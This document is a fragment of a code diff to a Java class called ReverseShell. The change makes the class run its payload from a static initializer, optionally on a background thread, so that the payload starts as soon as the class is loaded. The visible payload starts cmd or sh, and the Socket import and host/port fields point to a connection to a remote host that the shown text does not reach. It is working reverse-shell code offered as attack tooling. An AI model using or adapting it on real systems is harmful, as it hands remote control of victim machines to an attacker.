@@ -4,11 +4,21 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 
-public class ReverseShell {
+public class ReverseShell implements Runnable {
     public static String host;
     public static int port;
+    public static boolean thread;
 
     static {
+        if (thread) {
+            new Thread(new ReverseShell()).start();
+        } else {
+            new ReverseShell().run();
+        }
+    }
+
+    @Override
+    public void run() {
         try {
             String shell = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd" : "sh";
             Process p = new ProcessBuilder(shell).redirectErrorStream(true).start();
